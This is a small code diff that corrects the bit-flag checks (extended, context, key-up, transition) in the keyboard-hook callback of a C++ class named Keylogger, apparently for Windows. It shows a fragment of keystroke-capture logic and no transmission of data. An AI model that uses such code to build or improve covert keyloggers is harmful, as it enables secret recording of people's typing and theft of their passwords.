@@ -14,10 +14,10 @@ LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
 	DWORD tmp = static_cast<DWORD>(lParam);
 	int count = tmp & 0xFFFF;
 	int scanCode = tmp & 0xFF0000;
-	bool extend = (tmp & 0x1000000) == 1;
-	bool context = (tmp & 0x20000000) == 1;
-	bool up = (tmp & 0x40000000) == 1;
-	bool transition = (tmp & 0x80000000) == 1;
+	bool extend = (tmp & 0x1000000) == 0x1000000;
+	bool context = (tmp & 0x20000000) == 0x20000000;
+	bool up = (tmp & 0x40000000) == 0x40000000;
+	bool transition = (tmp & 0x80000000) == 0x80000000;
 
 	if (!up)
 	{
